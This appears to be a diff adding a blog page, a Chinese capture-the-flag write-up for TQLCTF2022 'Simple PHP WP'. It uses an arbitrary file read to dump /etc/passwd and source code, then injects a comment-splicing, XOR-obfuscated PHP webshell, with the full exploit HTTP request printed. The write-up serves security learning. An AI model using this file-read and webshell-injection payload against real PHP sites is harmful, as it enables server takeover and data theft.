@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>[TQLCTF2022] Simple PHP WP | A10ng_&#39;s Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="做杂项写脚本写到头皮发麻的ctf，我只遇到这一次，呜呜呜~还是我太菜了。。 这个题很有意思，写shell的姿势比较好玩，我在之前搞渗透的时候同">
+<meta name="author" content="admin">
+<link rel="canonical" href="https://a10nggg.github.io/archives/171/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.fc220c15db4aef0318bbf30adc45d33d4d7c88deff3238b23eb255afdc472ca6.css" integrity="sha256-/CIMFdtK7wMYu/MK3EXTPU18iN7/MjiyPrJVr9xHLKY=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://a10nggg.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://a10nggg.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://a10nggg.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://a10nggg.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://a10nggg.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://a10nggg.github.io/archives/171/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="[TQLCTF2022] Simple PHP WP" />
+<meta property="og:description" content="做杂项写脚本写到头皮发麻的ctf，我只遇到这一次，呜呜呜~还是我太菜了。。 这个题很有意思，写shell的姿势比较好玩，我在之前搞渗透的时候同" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://a10nggg.github.io/archives/171/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-02-21T13:22:27+00:00" />
+<meta property="article:modified_time" content="2022-02-21T13:22:27+00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="[TQLCTF2022] Simple PHP WP"/>
+<meta name="twitter:description" content="做杂项写脚本写到头皮发麻的ctf，我只遇到这一次，呜呜呜~还是我太菜了。。 这个题很有意思，写shell的姿势比较好玩，我在之前搞渗透的时候同"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://a10nggg.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "[TQLCTF2022] Simple PHP WP",
+      "item": "https://a10nggg.github.io/archives/171/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "[TQLCTF2022] Simple PHP WP",
+  "name": "[TQLCTF2022] Simple PHP WP",
+  "description": "做杂项写脚本写到头皮发麻的ctf，我只遇到这一次，呜呜呜~还是我太菜了。。 这个题很有意思，写shell的姿势比较好玩，我在之前搞渗透的时候同",
+  "keywords": [
+    
+  ],
+  "articleBody": "做杂项写脚本写到头皮发麻的ctf，我只遇到这一次，呜呜呜~还是我太菜了。。\n这个题很有意思，写shell的姿势比较好玩，我在之前搞渗透的时候同样遇到类似手法，类似于某版本的derder的后台getshell。\n所以就记录一下。\n打开题目是一个登录口，个人习惯，先测一下注入，发现是不存在的，然后注册一个号上去康康，这一康不得了，发现了有个功能点有任意文件读取，他是去加载本地文件的一个功能。并且文件的路径和文件名可控，在测试了/etc/passwd,成功读取了。\n{.wp-editor-md-post-content-link}\n然后在fuzz了一下flag文件名没有结果后，继续尝试下一步，把所有的源码读出来，我首先读了这个功能点的源码。发现是用的file_get_contents函数，所以并不存在文件包含。这里只能用来读源码了。\n\u003c?php\rerror_reporting(0);\r$image = (string)$_GET['image'];\recho ' ';\r?\u003e\r接下来继续读取index.php,我先把关键代码贴上再分析。\r\u003c?php\rerror_reporting(0);\rif(isset($_POST['user']) \u0026\u0026 isset($_POST['pass'])){\r$hash_user = md5($_POST['user']);\r$hash_pass = 'zsf'.md5($_POST['pass']);\rif(isset($_POST['punctuation'])){\r//filter\rif (strlen($_POST['user']) \u003e 6){\recho(\"\");\r}\relseif(strlen($_POST['website']) \u003e 25){\recho(\"\");\r}\relseif(strlen($_POST['punctuation']) \u003e 1000){\recho(\"\");\r}\relse{\rif(preg_match('/[^\\w\\/\\(\\)\\*\u003c\u003e]/', $_POST['user']) === 0){\rif (preg_match('/[^\\w\\/\\*:\\.\\;\\(\\)\\n\u003c\u003e]/', $_POST['website']) === 0){\r$_POST['punctuation'] = preg_replace(\"/[a-z,A-Z,0-9\u003e\\?]/\",\"\",$_POST['punctuation']);\r$template = file_get_contents('./template.html');\r$content = str_replace(\"__USER__\", $_POST['user'], $template);\r$content = str_replace(\"__PASS__\", $hash_pass, $content);\r$content = str_replace(\"__WEBSITE__\", $_POST['website'], $content);\r$content = str_replace(\"__PUNC__\", $_POST['punctuation'], $content);\rfile_put_contents('sandbox/'.$hash_user.'.php', $content);\recho(\"\");\r}\relse{\recho(\"\");\r}\r}\relse{\recho(\"\");\r}\r}\r}\relse{\rsetcookie(\"user\", $_POST['user'], time()+3600);\rsetcookie(\"pass\", $hash_pass, time()+3600);\rHeader(\"Location:sandbox/$hash_user.php\");\r}\r}\r?\u003e\r他这里会将传进来的密码MD5加密一下。在前面加上zsf。\n判断是否为注册的条件是看是否传入’punctuation’，如果没有传入他的话的话，他会判断为是登录行为，跳到else然后用之前的$hash_user为标识跳转到指定的页面。\n如果是登录的话。首先会判断长度，然后嵌套了几个判断，用正则匹配去拦掉危险字符。只有所有条件都满足，才会成功注册。这里他的正则表达式。\n我们先不去看，先看一下注册成功之后 的流程。他会先读取一个html文件赋值给$content变量，然后用我们传进来的用户名网站等参数去替换他，然后写到一个新的文件，文件名以$hash_user来命名。\n登录的话，跳转的界面就是用$hash_user来界定的，换句话来说，就是将每个用户的信息已经写道那个指定的文件了。\n我们继续读取template.html来看接下来的代码。我贴出关键的部分。\n\u003c?php\rerror_reporting(0);\r$user = ((string)__USER__);\r$pass = ((string)__PASS__);\rif(isset($_COOKIE['user']) \u0026\u0026 isset($_COOKIE['pass']) \u0026\u0026 $_COOKIE['user'] === $user \u0026\u0026 $_COOKIE['pass'] === $pass){\recho($_COOKIE['user']);\r}\relse{\rdie(\"\");\r}\r?\u003e\r关键代码在这里。这里的__USER\\_和\\_PASS__是我们再注的时候替换的地方，还有其他的两处在前端代码里。也就是，如果把\\__PASS__这里的代码，换成我们的wbshell。那是不是就getshell了，这里登录成功与否，已经不重要了。。\n现在我们回头去看正则表达式，由于密码会被哈希加密，我们就不用看了。。\nif(preg_match('/[^\\w\\/\\(\\)\\*\u003c\u003e]/', $_POST['user'])\rif (preg_match('/[^\\w\\/\\*:\\.\\;\\(\\)\\n\u003c\u003e]/', $_POST['website']) $_POST['punctuation'] = preg_replace(\"/[a-z,A-Z,0-9\u003e\\?]/\",\"\",$_POST['punctuation']);\rUser参数能输入的只有匹配字母、数字、下划线、还有括号、斜杠、星号、尖括号。\n但是这里user参数，有长度限制，六个字符，确实写不了一个webshell，然后我们继续看下一个website，长度限制25，这里是可以写shell的，但是正则那里做了限制，\n最后punctuation虽说没有长度限制，但是会将字母数字全替换为空这里问题不大，用异或或者取反，都能绕过，不就是一个小小的正则匹配嘛，办他！。但是这里有个问题，是’\u003e’和‘?’会被替换，用PHP短标签不闭合不了，路走到这里就没了。\n当我再看源码时发现了一个问题。\n{.wp-editor-md-post-content-link}\nPUNC的位置在USER之后，我们在这里可以用多行注释将中间的代码注释掉，然后在PUNC的地方 写入注释结束符，再写webshell，让他们结合起来，咱自己不传，用他自带的php标签。那就解决问题了。\n我们首先要将之前的括号给闭合掉然后再将中间代码注释，所以再user处我们传的内容就是“1)/_”。\n在punctuation处将注释闭合，然后写分号，这是php语法，没啥好说的然后后边再接上webshell，然后再接上/_因为后面没有闭合php标签，所以会报错。在后边加一个注释给他\n（在写“+“加号的 时候注意这个问题，需要将加号url编码一下。因为加号这里是等于空格的。在rce的空格被ban时可以用+绕过，题外话这是。）\n然后传进去的流量包就是这了\nPOST /index.php HTTP/1.1\rHost: 120.77.216.55:22336\rContent-Length: 98\rCache-Control: max-age=0\rUpgrade-Insecure-Requests: 1\rOrigin: http://120.77.216.55:22336\rContent-Type: application/x-www-form-urlencoded\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\rReferer: http://120.77.216.55:22336/index.php\rAccept-Encoding: gzip, deflate\rAccept-Language: zh-CN,zh;q=0.9\rConnection: close\ruser=1)/*\u0026pass=rr\u0026website=\u0026punctuation=*/;@$_%2b%2b;$__='#./|{'^'|~`//';${$__}[!$_](${$__}[$_]);/*\r写进去之后，这个文件的状态就是这样的，webshell是不是很自然的就写进去了，毫无违和感。\n{.wp-editor-md-post-content-link}\nWebshell写进去之后就在根目录下拿到flag了\n{.wp-editor-md-post-content-link}\n",
+  "wordCount" : "1757",
+  "inLanguage": "en",
+  "datePublished": "2022-02-21T13:22:27Z",
+  "dateModified": "2022-02-21T13:22:27Z",
+  "author":{
+    "@type": "Person",
+    "name": "admin"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://a10nggg.github.io/archives/171/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "A10ng_'s Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://a10nggg.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://a10nggg.github.io/" accesskey="h" title="A10ng_&#39;s Blog (Alt + H)">A10ng_&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://a10nggg.github.io/" title="首页">
+                    <span>首页</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/posts/" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/categories/" title="分类">
+                    <span>分类</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/tags/" title="标签">
+                    <span>标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/about/" title="关于">
+                    <span>关于</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/search/" title="搜索">
+                    <span>搜索</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      [TQLCTF2022] Simple PHP WP
+    </h1>
+    <div class="post-meta"><span title='2022-02-21 13:22:27 +0000 +0000'>February 21, 2022</span>&nbsp;·&nbsp;admin
+
+</div>
+  </header> 
+  <div class="post-content"><p>做杂项写脚本写到头皮发麻的ctf，我只遇到这一次，呜呜呜~还是我太菜了。。</p>
+<p>这个题很有意思，写shell的姿势比较好玩，我在之前搞渗透的时候同样遇到类似手法，类似于某版本的derder的后台getshell。<br>
+所以就记录一下。<br>
+打开题目是一个登录口，个人习惯，先测一下注入，发现是不存在的，然后注册一个号上去康康，这一康不得了，发现了有个功能点有任意文件读取，他是去加载本地文件的一个功能。并且文件的路径和文件名可控，在测试了/etc/passwd,成功读取了。<br>
+<a href="/uploads/2022/02/wp_editor_md_b45d633b2534b29608ff99d5684d7a6a.jpg"><img loading="lazy" src="/uploads/2022/02/wp_editor_md_b45d633b2534b29608ff99d5684d7a6a.jpg" alt=""  />
+</a>{.wp-editor-md-post-content-link}</p>
+<p>然后在fuzz了一下flag文件名没有结果后，继续尝试下一步，把所有的源码读出来，我首先读了这个功能点的源码。发现是用的file_get_contents函数，所以并不存在文件包含。这里只能用来读源码了。</p>
+<pre><code class="language-php line-numbers">&lt;?php
+error_reporting(0);
+$image = (string)$_GET['image'];
+echo '&lt;div class="img"&gt; &lt;img src="data:image/png;base64,' . base64_encode(file_get_contents($image)) . '" /&gt; &lt;/div&gt;';
+?&gt;
+接下来继续读取index.php,我先把关键代码贴上再分析。
+&lt;?php
+error_reporting(0);
+if(isset($_POST['user']) && isset($_POST['pass'])){
+    $hash_user = md5($_POST['user']);
+    $hash_pass = 'zsf'.md5($_POST['pass']);
+    if(isset($_POST['punctuation'])){
+        //filter
+        if (strlen($_POST['user']) &gt; 6){
+            echo("&lt;script&gt;alert('Username is too long!');&lt;/script&gt;");
+        }
+        elseif(strlen($_POST['website']) &gt; 25){
+            echo("&lt;script&gt;alert('Website is too long!');&lt;/script&gt;");
+        }
+        elseif(strlen($_POST['punctuation']) &gt; 1000){
+            echo("&lt;script&gt;alert('Punctuation is too long!');&lt;/script&gt;");
+        }
+        else{
+            if(preg_match('/[^\w\/\(\)\*&lt;&gt;]/', $_POST['user']) === 0){
+                if (preg_match('/[^\w\/\*:\.\;\(\)\n&lt;&gt;]/', $_POST['website']) === 0){
+                    $_POST['punctuation'] = preg_replace("/[a-z,A-Z,0-9&gt;\?]/","",$_POST['punctuation']);
+                    $template = file_get_contents('./template.html');
+                    $content = str_replace("__USER__", $_POST['user'], $template);
+                    $content = str_replace("__PASS__", $hash_pass, $content);
+                    $content = str_replace("__WEBSITE__", $_POST['website'], $content);
+                    $content = str_replace("__PUNC__", $_POST['punctuation'], $content);
+                    file_put_contents('sandbox/'.$hash_user.'.php', $content);
+                    echo("&lt;script&gt;alert('Successed!');&lt;/script&gt;");
+                }
+                else{
+                    echo("&lt;script&gt;alert('Invalid chars in website!');&lt;/script&gt;");
+                }
+            }
+            else{
+                echo("&lt;script&gt;alert('Invalid chars in username!');&lt;/script&gt;");
+            }
+        }
+    }
+    else{
+        setcookie("user", $_POST['user'], time()+3600);
+        setcookie("pass", $hash_pass, time()+3600);
+        Header("Location:sandbox/$hash_user.php");
+    }
+}
+?&gt;
+</code></pre>
+<p>他这里会将传进来的密码MD5加密一下。在前面加上zsf。<br>
+判断是否为注册的条件是看是否传入&rsquo;punctuation&rsquo;，如果没有传入他的话的话，他会判断为是登录行为，跳到else然后用之前的$hash_user为标识跳转到指定的页面。<br>
+如果是登录的话。首先会判断长度，然后嵌套了几个判断，用正则匹配去拦掉危险字符。只有所有条件都满足，才会成功注册。这里他的正则表达式。<br>
+我们先不去看，先看一下注册成功之后 的流程。他会先读取一个html文件赋值给$content变量，然后用我们传进来的用户名网站等参数去替换他，然后写到一个新的文件，文件名以$hash_user来命名。<br>
+登录的话，跳转的界面就是用$hash_user来界定的，换句话来说，就是将每个用户的信息已经写道那个指定的文件了。<br>
+我们继续读取template.html来看接下来的代码。我贴出关键的部分。</p>
+<pre><code class="language-php line-numbers">        &lt;?php
+            error_reporting(0);
+            $user = ((string)__USER__);
+            $pass = ((string)__PASS__);
+
+            if(isset($_COOKIE['user']) && isset($_COOKIE['pass']) && $_COOKIE['user'] === $user && $_COOKIE['pass'] === $pass){
+                echo($_COOKIE['user']);
+            }
+            else{
+                die("&lt;script&gt;alert('Permission denied!');&lt;/script&gt;");
+            }
+        ?&gt;
+</code></pre>
+<p>关键代码在这里。这里的__USER\<em>_和\</em>_PASS__是我们再注的时候替换的地方，还有其他的两处在前端代码里。也就是，如果把\__PASS__这里的代码，换成我们的wbshell。那是不是就getshell了，这里登录成功与否，已经不重要了。。<br>
+现在我们回头去看正则表达式，由于密码会被哈希加密，我们就不用看了。。</p>
+<pre><code class="language-php line-numbers">if(preg_match('/[^\w\/\(\)\*&lt;&gt;]/', $_POST['user'])
+if (preg_match('/[^\w\/\*:\.\;\(\)\n&lt;&gt;]/', $_POST['website']) 
+$_POST['punctuation'] = preg_replace("/[a-z,A-Z,0-9&gt;\?]/","",$_POST['punctuation']);
+</code></pre>
+<p>User参数能输入的只有匹配字母、数字、下划线、还有括号、斜杠、星号、尖括号。</p>
+<p>但是这里user参数，有长度限制，六个字符，确实写不了一个webshell，然后我们继续看下一个website，长度限制25，这里是可以写shell的，但是正则那里做了限制，<br>
+最后punctuation虽说没有长度限制，但是会将字母数字全替换为空这里问题不大，用异或或者取反，都能绕过，不就是一个小小的正则匹配嘛，办他！。但是这里有个问题，是’&gt;’和‘?’会被替换，用PHP短标签不闭合不了，路走到这里就没了。<br>
+当我再看源码时发现了一个问题。<br>
+<a href="/uploads/2022/02/wp_editor_md_ce273be3eb3ba8030dcbb0add976fe4b.jpg"><img loading="lazy" src="/uploads/2022/02/wp_editor_md_ce273be3eb3ba8030dcbb0add976fe4b.jpg" alt=""  />
+</a>{.wp-editor-md-post-content-link}</p>
+<p><strong>PUNC</strong>的位置在<strong>USER</strong>之后，我们在这里可以用多行注释将中间的代码注释掉，然后在<strong>PUNC</strong>的地方 写入注释结束符，再写webshell，让他们结合起来，咱自己不传，用他自带的php标签。那就解决问题了。<br>
+我们首先要将之前的括号给闭合掉然后再将中间代码注释，所以再user处我们传的内容就是“1)/_”。<br>
+在punctuation处将注释闭合，然后写分号，这是php语法，没啥好说的然后后边再接上webshell，然后再接上/_因为后面没有闭合php标签，所以会报错。在后边加一个注释给他<br>
+（在写“+“加号的 时候注意这个问题，需要将加号url编码一下。因为加号这里是等于空格的。在rce的空格被ban时可以用+绕过，题外话这是。）<br>
+然后传进去的流量包就是这了</p>
+<pre><code class="language-php line-numbers">POST /index.php HTTP/1.1
+Host: 120.77.216.55:22336
+Content-Length: 98
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://120.77.216.55:22336
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://120.77.216.55:22336/index.php
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+
+user=1)/*&pass=rr&website=&punctuation=*/;@$_%2b%2b;$__='#./|{'^'|~`//';${$__}[!$_](${$__}[$_]);/*
+</code></pre>
+<p>写进去之后，这个文件的状态就是这样的，webshell是不是很自然的就写进去了，毫无违和感。<br>
+<a href="/uploads/2022/02/wp_editor_md_e9fcd67118632bb2a27745a1a5e4ffff.jpg"><img loading="lazy" src="/uploads/2022/02/wp_editor_md_e9fcd67118632bb2a27745a1a5e4ffff.jpg" alt=""  />
+</a>{.wp-editor-md-post-content-link}</p>
+<p>Webshell写进去之后就在根目录下拿到flag了</p>
+<p><a href="/uploads/2022/02/wp_editor_md_0e824c8d190e37cd93e89c639d38686f.jpg"><img loading="lazy" src="/uploads/2022/02/wp_editor_md_0e824c8d190e37cd93e89c639d38686f.jpg" alt=""  />
+</a>{.wp-editor-md-post-content-link}</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2024 <a href="https://a10nggg.github.io/">A10ng_&#39;s Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
